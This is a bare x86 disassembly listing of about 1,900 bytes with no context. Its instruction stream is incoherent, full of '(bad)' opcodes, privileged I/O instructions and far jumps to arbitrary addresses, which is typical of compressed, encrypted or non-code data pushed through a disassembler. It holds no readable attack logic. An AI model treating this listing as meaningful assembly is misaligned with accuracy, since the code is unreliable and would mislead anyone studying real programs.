  41ee6b:	mov    al,BYTE PTR [eax-0x19]
  41ee6e:	ret    
  41ee6f:	mov    ebx,0x24931bcb
  41ee74:	push   cs
  41ee75:	jns    0x41ee06
  41ee77:	ficomp DWORD PTR [edx]
  41ee79:	ficom  DWORD PTR gs:[ebx-0x9838a23]
  41ee80:	call   0xfc4587d8
  41ee85:	ror    DWORD PTR [edi],cl
  41ee87:	push   ecx
  41ee88:	or     ecx,DWORD PTR [edx]
  41ee8a:	jo     0x41ee3b
  41ee8c:	aas    
  41ee8d:	stos   BYTE PTR es:[edi],al
  41ee8e:	or     eax,0x8164c7c
  41ee93:	mov    dl,0x43
  41ee95:	iret   
  41ee96:	push   ecx
  41ee97:	mov    al,BYTE PTR [eax-0x37]
  41ee9a:	jecxz  0x41ee60
  41ee9c:	add    ebx,DWORD PTR [ecx-0x10011e6a]
  41eea2:	cwde   
  41eea3:	hlt    
  41eea4:	das    
  41eea5:	fwait
  41eea6:	fs loop 0x41ee33
  41eea9:	push   edi
  41eeaa:	xchg   esp,eax
  41eeab:	scas   eax,DWORD PTR es:[edi]
  41eeac:	fwait
  41eead:	xor    al,ch
  41eeaf:	(bad)  
  41eeb0:	sbb    eax,0x9b860357
  41eeb5:	push   edi
  41eeb6:	fs mov cl,0x49
  41eeb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeba:	aam    0x41
  41eebc:	cmp    esp,DWORD PTR [ebp+eax*2+0x1f]
  41eec0:	inc    ecx
  41eec1:	and    bh,BYTE PTR [eax+0x19232df5]
  41eec7:	loop   0x41ee49
  41eec9:	pop    ebp
  41eeca:	bound  eax,QWORD PTR [edx+0x5c]
  41eecd:	or     al,BYTE PTR [edi-0x432912df]
  41eed3:	call   0xc266:0x7415c0f6
  41eeda:	loopne 0x41eec0
  41eedc:	cmp    eax,0xdbea7904
  41eee1:	lock adc DWORD PTR [ecx],ecx
  41eee4:	(bad)  
  41eee5:	ins    BYTE PTR es:[edi],dx
  41eee6:	mov    ebp,0x313fcd69
  41eeeb:	scas   al,BYTE PTR es:[edi]
  41eeec:	mov    bh,BYTE PTR [edi+0x3e]
  41eeef:	dec    ebp
  41eef0:	cli    
  41eef1:	dec    ebp
  41eef2:	mov    cl,0xbd
  41eef4:	dec    edi
  41eef5:	mov    esi,0x26e5ef69
  41eefa:	bound  eax,QWORD PTR [eax-0x6]
  41eefd:	je     0x41ee80
  41eeff:	pop    eax
  41ef00:	mov    ds:0xa161146,al
  41ef05:	lock pop edi
  41ef07:	cs loop 0x41ef02
  41ef0a:	pushf  
  41ef0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef0c:	push   esi
  41ef0d:	dec    ebx
  41ef0e:	pop    ebp
  41ef0f:	ins    DWORD PTR es:[edi],dx
  41ef10:	add    ch,BYTE PTR [esi+0x22]
  41ef13:	dec    edi
  41ef14:	xor    ah,cl
  41ef16:	mov    esp,0x213c1ed0
  41ef1b:	addr16 and al,0xcb
  41ef1e:	addr16 xor al,0x2b
  41ef21:	mov    edx,0x80d8184f
  41ef26:	push   es
  41ef27:	jmp    0x41ef5f
  41ef29:	inc    bx
  41ef2b:	mov    bl,0xed
  41ef2d:	aam    0x6
  41ef2f:	in     eax,0x3c
  41ef31:	dec    edi
  41ef32:	shr    BYTE PTR [esi+0x362a7369],cl
  41ef38:	xor    bh,BYTE PTR [esi]
  41ef3a:	test   al,0x1c
  41ef3c:	inc    ah
  41ef3e:	push   edi
  41ef3f:	add    bh,BYTE PTR [edi]
  41ef41:	push   edx
  41ef42:	call   0xbca8b37d
  41ef47:	xchg   ebx,eax
  41ef48:	scas   eax,DWORD PTR es:[edi]
  41ef49:	push   ss
  41ef4a:	loop   0x41ef9c
  41ef4c:	mov    ds:0xd77bab85,eax
  41ef51:	out    dx,al
  41ef52:	jno    0x41eefa
  41ef54:	lods   al,BYTE PTR ds:[esi]
  41ef55:	sbb    esi,ecx
  41ef57:	or     al,0xd9
  41ef59:	rol    BYTE PTR [eax+ebx*2-0x357fa2b5],1
  41ef60:	jbe    0x41ef65
  41ef62:	mov    ds:0xde51ca9d,eax
  41ef67:	jne    0x41efbd
  41ef69:	(bad)  
  41ef6a:	(bad)  
  41ef6b:	cli    
  41ef6c:	test   DWORD PTR [edi],ecx
  41ef6e:	aad    0x24
  41ef70:	loope  0x41ef36
  41ef72:	sbb    eax,0xb374f026
  41ef77:	adc    al,0x48
  41ef79:	or     eax,0xfd470e67
  41ef7e:	mov    edi,0xc22157cc
  41ef83:	xor    eax,0xb6e4eee
  41ef88:	int3   
  41ef89:	clc    
  41ef8a:	jmp    0x41ef3e
  41ef8c:	xchg   esp,eax
  41ef8d:	ins    BYTE PTR es:[edi],dx
  41ef8e:	xchg   esi,eax
  41ef8f:	ss jne 0x41efc6
  41ef92:	in     al,dx
  41ef93:	inc    ebx
  41ef94:	and    al,0xa0
  41ef96:	inc    edx
  41ef97:	xchg   edx,eax
  41ef98:	or     BYTE PTR [edi-0x5ff9ff39],0xd1
  41ef9f:	fsubr  DWORD PTR [eax]
  41efa1:	mov    dh,0x58
  41efa3:	push   es
  41efa4:	neg    DWORD PTR [ecx+edx*4+0x3c]
  41efa8:	pop    esi
  41efa9:	push   ebp
  41efaa:	xchg   esp,eax
  41efab:	adc    ebx,eax
  41efad:	mul    BYTE PTR [edi+0x60df38b1]
  41efb3:	arpl   WORD PTR [ebp-0x567ff767],si
  41efb9:	pushf  
  41efba:	shr    bh,0x21
  41efbd:	mov    ecx,0x9c72c5e2
  41efc2:	lods   al,BYTE PTR ds:[esi]
  41efc3:	bound  ecx,QWORD PTR [edx+ecx*1]
  41efc6:	cmp    DWORD PTR [edi-0x75d308a8],esp
  41efcc:	jmp    0xf5c1169c
  41efd1:	mov    DWORD PTR [eax],eax
  41efd3:	ret    0x85af
  41efd6:	inc    esi
  41efd7:	cmp    ebx,esp
  41efd9:	mov    eax,gs:0xc19f85cc
  41efdf:	jmp    0x7c2f:0x6a1cc898
  41efe6:	lahf   
  41efe7:	push   esi
  41efe8:	jns    0x41efa7
  41efea:	dec    eax
  41efeb:	aam    0xd3
  41efed:	and    DWORD PTR [edx+edx*2-0x76],ebp
  41eff1:	int3   
  41eff2:	loope  0x41ef84
  41eff4:	dec    esi
  41eff5:	pop    ebp
  41eff6:	cmp    BYTE PTR [ecx-0x43],bl
  41eff9:	jmp    0x6df2:0x39528634
  41f000:	cdq    
  41f001:	aaa    
  41f002:	jmp    0x41f007
  41f004:	mov    edi,0xfdda4367
  41f009:	dec    esi
  41f00a:	aaa    
  41f00b:	mov    dl,0x1d
  41f00d:	xor    BYTE PTR [edi+0x24],dh
  41f010:	scas   eax,DWORD PTR es:[edi]
  41f011:	test   BYTE PTR [ecx+0x2ddb71f4],bh
  41f017:	cwde   
  41f018:	rcl    BYTE PTR ds:0x95f11159,cl
  41f01e:	or     edx,DWORD PTR [ebp+edi*8+0x79]
  41f022:	dec    ebp
  41f023:	sahf   
  41f024:	das    
  41f025:	sub    ah,al
  41f027:	repz adc ebp,DWORD PTR [edi-0x1c]
  41f02b:	arpl   dx,si
  41f02d:	dec    DWORD PTR [edi+0xb]
  41f030:	(bad)  [edx+0x71]
  41f033:	int3   
  41f034:	ret    
  41f035:	xor    al,0x6c
  41f037:	add    ch,0x55
  41f03a:	loop   0x41f0b3
  41f03c:	pop    eax
  41f03d:	mov    esi,edi
  41f03f:	mov    dl,0x4b
  41f041:	push   ds
  41f042:	mov    edi,0x81a26f07
  41f047:	pop    es
  41f048:	nop
  41f049:	enter  0xd9d0,0x75
  41f04d:	retf   0x951
  41f050:	shl    BYTE PTR [esi+edx*2-0x87443da],1
  41f057:	add    cl,BYTE PTR [edx+0x69b3dfb2]
  41f05d:	xor    BYTE PTR [ecx-0x4e],al
  41f060:	dec    edx
  41f061:	aas    
  41f062:	adc    BYTE PTR [ecx],dl
  41f064:	push   esi
  41f065:	sti    
  41f066:	rcl    dl,1
  41f068:	mov    ds:0x9fadf5af,al
  41f06d:	mov    dh,0x58
  41f06f:	test   eax,0x610dcc4a
  41f074:	xor    eax,0x8c3e7530
  41f079:	sahf   
  41f07a:	shr    edi,0x88
  41f07d:	fdiv   DWORD PTR [ebp-0x4831fdb4]
  41f083:	jmp    0x41f0bf
  41f085:	je     0x41f060
  41f087:	push   0x40
  41f089:	sbb    al,0x19
  41f08b:	pop    ecx
  41f08c:	lahf   
  41f08d:	shl    dl,cl
  41f08f:	adc    al,0xd1
  41f091:	xor    dh,al
  41f093:	popf   
  41f094:	add    bh,al
  41f096:	push   0x2f
  41f098:	hlt    
  41f099:	aas    
  41f09a:	add    eax,0x993da130
  41f09f:	pop    ebx
  41f0a0:	jnp    0x41f0ed
  41f0a2:	into   
  41f0a3:	xor    DWORD PTR [esp+ebp*2-0x39993a6e],ebx
  41f0aa:	dec    esp
  41f0ab:	or     dl,BYTE PTR [edi]
  41f0ad:	inc    edi
  41f0ae:	mov    ds,WORD PTR [ebx-0x4458645d]
  41f0b4:	jg     0x41f0dc
  41f0b6:	adc    al,BYTE PTR [ecx-0x565944bd]
  41f0bc:	xchg   ebx,eax
  41f0bd:	mov    edx,0x98839662
  41f0c2:	push   ecx
  41f0c3:	and    esi,ecx
  41f0c5:	pop    eax
  41f0c6:	or     eax,0x9b4ee670
  41f0cb:	mov    ecx,0xa12f6f3a
  41f0d0:	mov    dh,0x65
  41f0d2:	daa    
  41f0d3:	jae    0x41f139
  41f0d5:	call   0xc8d24ef7
  41f0da:	sub    BYTE PTR [edx+0x1b],dl
  41f0dd:	loope  0x41f104
  41f0df:	stos   BYTE PTR es:[edi],al
  41f0e0:	jmp    0x1cf8:0xb3d7e7e3
  41f0e7:	repnz mov al,ds:0x50e7c802
  41f0ed:	je     0x41f0a5
  41f0ef:	ds push ebp
  41f0f1:	and    BYTE PTR [edx+0x5a],0x89
  41f0f5:	push   0x3
  41f0f7:	repz jae 0x41f0fb
  41f0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0fb:	scas   al,BYTE PTR es:[edi]
  41f0fc:	fistp  WORD PTR [esi]
  41f0fe:	inc    DWORD PTR [ebx-0x7b]
  41f101:	pushf  
  41f102:	daa    
  41f103:	xlat   BYTE PTR ds:[ebx]
  41f104:	push   edx
  41f105:	pop    ds
  41f106:	mov    DWORD PTR [ebx+0x2120f24a],ebx
  41f10c:	dec    ebp
  41f10d:	xor    dh,BYTE PTR [ebp+0x48]
  41f110:	not    BYTE PTR [edi]
  41f112:	test   BYTE PTR [ebx+0x4a],0xd1
  41f116:	ja     0x41f143
  41f118:	repnz jecxz 0x41f122
  41f11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f11c:	call   0x5a91:0xc546f72e
  41f123:	mov    dl,0x8b
  41f125:	and    eax,0x5c5cce02
  41f12a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f12b:	mov    esi,DWORD PTR [esi-0x522dfc8c]
  41f131:	sub    ch,ch
  41f133:	push   ds
  41f134:	loop   0x41f149
  41f136:	imul   esp,DWORD PTR [esi-0x1a04f996],0xffffffba
  41f13d:	fldln2 
  41f13f:	shr    ch,0x6d
  41f142:	adc    edi,DWORD PTR [ebp+edx*4+0xb54db23]
  41f149:	retf   0xc1d4
  41f14c:	push   ecx
  41f14d:	loopne 0x41f12f
  41f14f:	scas   al,BYTE PTR es:[edi]
  41f150:	dec    edi
  41f151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f152:	jno    0x41f1ab
  41f154:	nop
  41f155:	hlt    
  41f156:	jne    0x41f112
  41f158:	xchg   esi,eax
  41f159:	imul   bh
  41f15b:	daa    
  41f15c:	inc    esp
  41f15d:	ins    DWORD PTR es:[edi],dx
  41f15e:	out    0xf7,eax
  41f160:	dec    edi
  41f161:	je     0x41f141
  41f163:	push   ebx
  41f164:	popa   
  41f165:	aaa    
  41f166:	jbe    0x41f1b6
  41f168:	or     eax,0x31d8e92e
  41f16d:	jl     0x41f1d4
  41f16f:	jae    0x41f1c9
  41f171:	out    dx,al
  41f172:	shl    BYTE PTR [di],0x85
  41f176:	push   ebp
  41f177:	xor    cl,BYTE PTR [edx-0x871c36a]
  41f17d:	(bad)  
  41f17e:	fiadd  DWORD PTR [ebp+ebp*4-0x66]
  41f182:	test   eax,0x9c2127e5
  41f187:	fisub  WORD PTR [ecx]
  41f189:	jg     0x41f1ae
  41f18b:	lods   al,BYTE PTR ds:[esi]
  41f18c:	sub    BYTE PTR [esi],ch
  41f18e:	jo     0x41f131
  41f190:	xchg   ecx,eax
  41f191:	push   ebp
  41f192:	dec    esp
  41f193:	or     ebx,DWORD PTR [esi]
  41f195:	mov    dh,0x57
  41f197:	dec    esi
  41f198:	jae    0x41f1a5
  41f19a:	mov    edi,0x7e9a2530
  41f19f:	repz aas 
  41f1a1:	push   eax
  41f1a2:	add    BYTE PTR [ebx-0x53],0xec
  41f1a6:	stos   DWORD PTR es:[edi],eax
  41f1a7:	sbb    BYTE PTR [ebx+eiz*1+0x7e],bl
  41f1ab:	push   eax
  41f1ac:	inc    esi
  41f1ad:	pusha  
  41f1ae:	ja     0x41f1d4
  41f1b0:	(bad)  
  41f1b1:	repz loopne 0x41f17b
  41f1b4:	mov    ds:0xc74d895e,al
  41f1b9:	inc    eax
  41f1ba:	in     eax,dx
  41f1bb:	inc    edx
  41f1bc:	shl    ebx,1
  41f1be:	pop    ss
  41f1bf:	stos   DWORD PTR es:[edi],eax
  41f1c0:	in     eax,0x28
  41f1c2:	frstor [esi]
  41f1c4:	inc    ebp
  41f1c5:	je     0x41f152
  41f1c7:	and    al,0xc9
  41f1c9:	cmp    DWORD PTR [ecx],0x94024850
  41f1cf:	and    ah,al
  41f1d1:	sbb    eax,0x71d800c8
  41f1d6:	push   edi
  41f1d7:	stc    
  41f1d8:	(bad)  
  41f1d9:	xor    ah,BYTE PTR [ebp+0x10]
  41f1dc:	ret    
  41f1dd:	sub    BYTE PTR [edi],ah
  41f1df:	mov    dh,0xdc
  41f1e1:	ins    BYTE PTR es:[edi],dx
  41f1e2:	scas   al,BYTE PTR es:[edi]
  41f1e3:	xor    BYTE PTR [ebp-0x3409a69a],ch
  41f1e9:	fwait
  41f1ea:	nop
  41f1eb:	jmp    0x41f1f6
  41f1ed:	xor    bl,bh
  41f1ef:	repz and ch,bl
  41f1f2:	addr16 adc al,0xc7
  41f1f5:	div    BYTE PTR ds:0xfcdd8b4c
  41f1fb:	mov    al,0x79
  41f1fd:	call   0x9d8189a5
  41f202:	mov    dh,0xad
  41f204:	rcl    DWORD PTR ds:0x70b228b3,cl
  41f20a:	adc    DWORD PTR [esi],esi
  41f20c:	aaa    
  41f20d:	and    ch,BYTE PTR [esi-0x5]
  41f210:	ss xor al,0x71
  41f213:	dec    ebx
  41f214:	mov    edi,0x2777b002
  41f219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f21a:	test   ebp,eax
  41f21c:	std    
  41f21d:	leave  
  41f21e:	je     0x41f24e
  41f220:	xor    eax,0xb665cd6d
  41f225:	or     eax,0x89436329
  41f22a:	or     DWORD PTR [ecx+0x457678c7],edi
  41f230:	mov    ds:0x5da9a554,al
  41f235:	nop
  41f236:	pop    esp
  41f237:	xor    eax,DWORD PTR gs:[ebx]
  41f23a:	pop    ss
  41f23b:	push   ss
  41f23c:	mov    ecx,0x66756cdd
  41f241:	ins    BYTE PTR es:[edi],dx
  41f242:	bound  eax,QWORD PTR [edx-0x16]
  41f245:	lock xchg ebx,eax
  41f247:	mov    bl,0x36
  41f249:	pop    ebp
  41f24a:	adc    DWORD PTR [ebx],edx
  41f24c:	cmc    
  41f24d:	shl    DWORD PTR [eax],cl
  41f24f:	je     0x41f2bb
  41f251:	std    
  41f252:	dec    esi
  41f253:	popf   
  41f254:	into   
  41f255:	add    bh,ah
  41f257:	jle    0x41f229
  41f259:	inc    ecx
  41f25a:	lea    edi,[esi]
  41f25c:	lods   eax,DWORD PTR ds:[esi]
  41f25d:	scas   eax,DWORD PTR es:[edi]
  41f25e:	popa   
  41f25f:	outs   dx,DWORD PTR ds:[esi]
  41f260:	cld    
  41f261:	xchg   edi,eax
  41f262:	and    bl,dh
  41f264:	adc    DWORD PTR [edi],0x78e37e91
  41f26a:	or     esi,esp
  41f26c:	mov    al,0x50
  41f26e:	mov    esi,0xa54752b4
  41f273:	or     bl,BYTE PTR [eax+0x65]
  41f276:	push   eax
  41f277:	imul   ecx,DWORD PTR [edi-0x3c],0x19fa2193
  41f27e:	loope  0x41f2cd
  41f280:	outs   dx,BYTE PTR ds:[esi]
  41f281:	push   es
  41f282:	sbb    al,0xa4
  41f284:	cmp    eax,0xcef46a0a
  41f289:	push   ebp
  41f28a:	jmp    0x41f2e8
  41f28c:	jge    0x41f216
  41f28e:	retf   
  41f28f:	ins    DWORD PTR es:[edi],dx
  41f290:	and    BYTE PTR [ecx],bh
  41f292:	mov    edi,ebx
  41f294:	and    al,0xb2
  41f296:	scas   al,BYTE PTR es:[edi]
  41f297:	or     DWORD PTR [eax-0x12],esi
  41f29a:	inc    esi
  41f29b:	fnsave [ebp-0xa]
  41f29e:	mov    eax,ds:0x3682069a
  41f2a3:	jno    0x41f309
  41f2a5:	in     al,0xda
  41f2a7:	sub    cl,ch
  41f2a9:	ins    BYTE PTR es:[edi],dx
  41f2aa:	test   eax,0x83521e92
  41f2af:	outs   dx,BYTE PTR ds:[esi]
  41f2b0:	mov    bl,0xd5
  41f2b2:	sti    
  41f2b3:	daa    
  41f2b4:	mov    bl,0x4e
  41f2b6:	push   cs
  41f2b7:	add    al,0xe7
  41f2b9:	inc    esi
  41f2ba:	in     al,0xd0
  41f2bc:	dec    esp
  41f2bd:	and    eax,0xb274a273
  41f2c2:	(bad)
  41f2c6:	push   cs
  41f2c7:	lods   al,BYTE PTR ds:[esi]
  41f2c8:	and    al,0x7c
  41f2ca:	(bad)  
  41f2cb:	sbb    dh,ch
  41f2cd:	xlat   BYTE PTR ds:[ebx]
  41f2ce:	int    0xfd
  41f2d0:	dec    edi
  41f2d1:	pop    ss
  41f2d2:	mov    esp,0xc357dd76
  41f2d7:	cwde   
  41f2d8:	cmp    eax,0x333f13ae
  41f2dd:	jnp    0x41f2e9
  41f2df:	pusha  
  41f2e0:	cmp    cl,dl
  41f2e2:	arpl   WORD PTR [edi-0x7d7ce017],si
  41f2e8:	pop    es
  41f2e9:	xchg   ebx,eax
  41f2ea:	jno    0x41f2b6
  41f2ec:	lahf   
  41f2ed:	je     0x41f335
  41f2ef:	xchg   ebp,eax
  41f2f0:	jecxz  0x41f31c
  41f2f2:	cld    
  41f2f3:	fcomi  st,st(1)
  41f2f5:	ja     0x41f311
  41f2f7:	xchg   BYTE PTR [ebx],al
  41f2f9:	push   ss
  41f2fa:	pop    esi
  41f2fb:	mov    esi,0x29dab11f
  41f300:	xor    dl,al
  41f302:	sub    eax,0xda8d4692
  41f307:	pop    eax
  41f308:	repz pushw 0x3f
  41f30c:	push   esi
  41f30d:	xchg   ecx,eax
  41f30e:	cmp    eax,0xdaa1a801
  41f313:	pop    ds
  41f314:	aad    0xd
  41f316:	sti    
  41f317:	stc    
  41f318:	bound  esp,QWORD PTR [eax]
  41f31a:	jno    0x41f2bf
  41f31c:	sub    dl,BYTE PTR [ebp+ebx*4-0x67ba2ea1]
  41f323:	jbe    0x41f2f2
  41f325:	push   ecx
  41f326:	jmp    0xe254:0xd314334a
  41f32d:	sbb    al,0x56
  41f32f:	push   ss
  41f330:	sbb    DWORD PTR [ebx],0xe6223848
  41f336:	sub    ebx,DWORD PTR [edx]
  41f338:	aam    0x57
  41f33a:	mov    ds:0x3e40e578,al
  41f33f:	adc    al,0x2b
  41f341:	jbe    0x41f355
  41f343:	leave  
  41f344:	push   edx
  41f345:	and    al,0xd3
  41f347:	or     al,0x62
  41f349:	in     eax,dx
  41f34a:	inc    edi
  41f34b:	pop    es
  41f34c:	pop    esi
  41f34d:	lahf   
  41f34e:	sub    eax,0x4dbb76e7
  41f353:	xchg   esp,eax
  41f354:	das    
  41f355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f356:	push   cs
  41f357:	ds mov bh,0x5e
  41f35a:	and    eax,0xd1107b9c
  41f35f:	jge    0x41f3a9
  41f361:	mov    ch,0x87
  41f363:	aad    0xff
  41f365:	xlat   BYTE PTR ds:[ebx]
  41f366:	jb     0x41f327
  41f368:	mov    ch,0x93
  41f36a:	push   edi
  41f36b:	leave  
  41f36c:	hlt    
  41f36d:	mov    ds:0x96151484,eax
  41f372:	fild   WORD PTR [eax]
  41f374:	stc    
  41f375:	sbb    esi,0x6a
  41f378:	hlt    
  41f379:	mov    ch,0xe3
  41f37b:	adc    al,0x51
  41f37d:	adc    eax,0xdfc1cec5
  41f382:	aad    0x6c
  41f384:	daa    
  41f385:	push   esi
  41f386:	add    DWORD PTR [edx],0xf13af3cf
  41f38c:	loope  0x41f339
  41f38e:	dec    ebp
  41f38f:	and    edi,ecx
  41f391:	jb     0x41f31c
  41f393:	data16 fcomp QWORD PTR cs:[ebx-0x57d62a3b]
  41f39b:	cmp    eax,DWORD PTR [eax+edx*2+0x72af5f53]
  41f3a2:	cli    
  41f3a3:	push   cs
  41f3a4:	in     al,dx
  41f3a5:	mov    ebx,0xa831072
  41f3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3ab:	fistp  QWORD PTR [eax]
  41f3ad:	sbb    al,0xef
  41f3af:	pop    edx
  41f3b0:	ss dec ecx
  41f3b2:	fild   DWORD PTR [ebp-0x11648e3a]
  41f3b8:	stos   DWORD PTR es:[edi],eax
  41f3b9:	inc    esi
  41f3ba:	xor    eax,0xbb955e03
  41f3bf:	xor    DWORD PTR [ebx+edx*8-0x39deb0c5],0xc5bb1b13
  41f3ca:	dec    ebx
  41f3cb:	fadd   DWORD PTR ds:0xad93ccd3
  41f3d1:	pop    edx
  41f3d2:	jmp    0x927b:0x2a955a80
  41f3d9:	stos   BYTE PTR es:[edi],al
  41f3da:	xor    eax,0xb3f4b27f
  41f3df:	xchg   ebp,eax
  41f3e0:	xor    ebp,edx
  41f3e2:	mov    eax,edi
  41f3e4:	outs   dx,BYTE PTR ds:[esi]
  41f3e5:	xor    ebx,ebp
  41f3e7:	call   0x476846c2
  41f3ec:	ins    DWORD PTR es:[edi],dx
  41f3ed:	push   esi
  41f3ee:	xor    eax,DWORD PTR [ecx]
  41f3f0:	inc    ebx
  41f3f1:	std    
  41f3f2:	retf   
  41f3f3:	xor    eax,0xb14cce73
  41f3f8:	mov    ebx,0x3064b9c2
  41f3fd:	call   FWORD PTR [eax-0x74acb1e9]
  41f403:	adc    eax,0x7e982f3e
  41f408:	or     ah,BYTE PTR [esi-0x50157de5]
  41f40e:	xchg   esi,eax
  41f40f:	xchg   DWORD PTR [edi+eax*4+0x705314be],esp
  41f416:	imul   edx,edi,0x49
  41f419:	mov    edx,0x6c5be8c8
  41f41e:	in     eax,0xaa
  41f420:	xchg   BYTE PTR [esi+ecx*8],dl
  41f423:	pop    ecx
  41f424:	sub    ebp,0x4e450485
  41f42a:	test   eax,0xbc9b818e
  41f42f:	popf   
  41f430:	jb     0x41f420
  41f432:	mov    edi,0x2a6d7ede
  41f437:	inc    edx
  41f438:	cmp    al,0x8d
  41f43a:	cmp    ecx,DWORD PTR [eax-0x41]
  41f43d:	pop    ebx
  41f43e:	and    al,BYTE PTR [ecx-0x3a]
  41f441:	out    0x30,eax
  41f443:	sub    al,0xc1
  41f445:	ds jo  0x41f3f7
  41f448:	jae    0x41f411
  41f44a:	inc    edx
  41f44b:	and    eax,0x48265611
  41f450:	adc    al,0x85
  41f452:	es js  0x41f427
  41f455:	and    ebp,ebp
  41f457:	jle    0x41f3fd
  41f459:	test   cl,al
  41f45b:	jecxz  0x41f465
  41f45d:	mov    eax,0xbe859761
  41f462:	in     eax,0x9e
  41f464:	stos   DWORD PTR es:[edi],eax
  41f465:	outs   dx,DWORD PTR ds:[esi]
  41f466:	icebp  
  41f467:	ret    
  41f468:	dec    ebx
  41f469:	jle    0x41f462
  41f46b:	sub    esi,DWORD PTR ds:0x430435fb
  41f471:	fmul   st(0),st
  41f473:	mov    ebx,0xdb6b6d19
  41f478:	stos   BYTE PTR es:[edi],al
  41f479:	inc    ebx
  41f47a:	push   ds
  41f47b:	cwde   
  41f47c:	in     eax,0xb5
  41f47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f47f:	aas    
  41f480:	fimul  DWORD PTR [ebp+0x5e]
  41f483:	pop    es
  41f484:	dec    ecx
  41f485:	aam    0x9d
  41f487:	out    dx,eax
  41f488:	pop    ds
  41f489:	mov    ch,0x45
  41f48b:	cli    
  41f48c:	xor    BYTE PTR [ebx-0x2d],bl
  41f48f:	lahf   
  41f490:	jne    0x41f46c
  41f492:	jbe    0x41f44a
  41f494:	inc    edx
  41f495:	sbb    al,0x41
  41f497:	mov    ds:0x37a98bf5,eax
  41f49c:	(bad)  
  41f49e:	mov    al,ds:0xed430b8a
  41f4a3:	push   ss
  41f4a4:	fwait
  41f4a5:	loopne 0x41f518
  41f4a7:	int    0xe4
  41f4a9:	adc    cl,dh
  41f4ab:	fild   WORD PTR [edi-0x8]
  41f4ae:	mov    ch,0xcd
  41f4b0:	cmp    al,0x92
  41f4b2:	not    BYTE PTR [edi]
  41f4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4b5:	ds fdivp st(2),st
  41f4b8:	mov    ds:0x900a6771,eax
  41f4bd:	adc    edx,DWORD PTR [eax]
  41f4bf:	push   esp
  41f4c0:	adc    ch,cl
  41f4c2:	fld    DWORD PTR [ebx+eiz*1]
  41f4c5:	add    edi,esi
  41f4c7:	clc    
  41f4c8:	imul   eax,DWORD PTR [edx+0x6a],0x4
  41f4cc:	inc    edi
  41f4cd:	test   eax,0x2f7e2d7f
  41f4d2:	retf   0x5639
  41f4d5:	and    DWORD PTR [ebx+0x3c6ac690],ecx
  41f4db:	sub    DWORD PTR [edi+0xb],edi
  41f4de:	mov    al,0xb3
  41f4e0:	test   al,0x7e
  41f4e2:	imul   edx,DWORD PTR ds:0xb4e5eb2f,0x60fde56a
  41f4ec:	ss jnp 0x41f473
  41f4ef:	shl    DWORD PTR [eax-0x62d9eeba],cl
  41f4f5:	nop
  41f4f6:	sub    dh,BYTE PTR [ebp+ecx*8-0xca71fd]
  41f4fd:	push   ebx
  41f4fe:	adc    BYTE PTR [edi],bl
  41f500:	push   esi
  41f501:	dec    esp
  41f502:	imul   eax,DWORD PTR [esi+0x67],0xffffffd4
  41f506:	hlt    
  41f507:	mov    ebx,0x48cf51ad
  41f50c:	in     eax,0x86
  41f50e:	mov    ebp,0x461fe288
  41f513:	js     0x41f562
  41f515:	and    eax,0x8bd7900e
  41f51a:	cwde   
  41f51b:	mov    dl,bh
  41f51d:	ds or  al,0xdf
  41f520:	mov    ebp,0x3a8419e8
  41f525:	ins    BYTE PTR es:[edi],dx
  41f526:	lea    edx,[eax+esi*4+0x53]
  41f52a:	lahf   
  41f52b:	pop    eax
  41f52c:	retf   0xc6df
  41f52f:	aad    0xb5
  41f531:	fsub   DWORD PTR ds:0x4c98866c
  41f537:	and    al,0x41
  41f539:	(bad)  
  41f53b:	imul   eax,DWORD PTR [edi-0xacf6fe],0xa23d8c49
  41f545:	jp     0x41f4ef
  41f547:	into   
  41f548:	sbb    al,0xd7
  41f54a:	stos   BYTE PTR es:[edi],al
  41f54b:	adc    bh,BYTE PTR [esi-0x45e81ed3]
  41f551:	xor    DWORD PTR [ecx-0x73],eax
  41f554:	pop    edx
  41f555:	lds    ebp,FWORD PTR [ecx]
  41f557:	fldcw  WORD PTR [esi-0x79]
  41f55a:	lea    ecx,[ebx+ebx*1+0x377b36c5]
  41f561:	mov    dl,0x56
  41f563:	sub    cl,0xbd
  41f566:	inc    ebx
  41f567:	xchg   edx,eax
  41f568:	ins    BYTE PTR es:[edi],dx
  41f569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f56a:	jns    0x41f52c
  41f56c:	mov    DWORD PTR ds:[edx-0x61787895],ebx
  41f573:	and    dh,bl
  41f575:	jae    0x41f5db
  41f577:	pop    ecx
  41f578:	jns    0x41f5da
  41f57a:	pushf  
  41f57b:	add    ah,BYTE PTR [edi-0x64]
  41f57e:	cmp    eax,0xbcf7a1bc
  41f583:	jmp    0xf1edcb48
  41f588:	jnp    0x41f5a3
  41f58a:	jmp    0x5395dc67
  41f58f:	call   0xea8:0x92f599f9
  41f596:	loopne 0x41f5bf
  41f598:	push   esp
  41f599:	and    edx,DWORD PTR [esp+edi*1-0x5c]
  41f59d:	fsub   QWORD PTR [edx+0x26]
  41f5a0:	cld    
  41f5a1:	hlt    
  41f5a2:	sbb    eax,0x9e5245aa
  41f5a7:	shl    DWORD PTR [eax-0x70],0x7e
  41f5ab:	xchg   ebx,eax
  41f5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5ad:	sbb    esi,esp
  41f5af:	into   
  41f5b0:	sub    al,0xb4
  41f5b2:	sbb    eax,0x911036f5
  41f5b7:	into   
  41f5b8:	xchg   edx,eax
  41f5b9:	or     DWORD PTR [edx+0x75c727f8],edi
  41f5bf:	mov    ebx,0x968ff392
  41f5c4:	or     DWORD PTR [edx],edx
  41f5c6:	lds    ecx,FWORD PTR ds:0xf8bb5cbe
  41f5cc:	xchg   edi,eax
  41f5cd:	nop
  41f5ce:	pop    edi
  41f5cf:	push   es
  41f5d0:	outs   dx,BYTE PTR ds:[esi]
  41f5d1:	loop   0x41f60d
  41f5d3:	stos   DWORD PTR es:[edi],eax
  41f5d4:	popa   
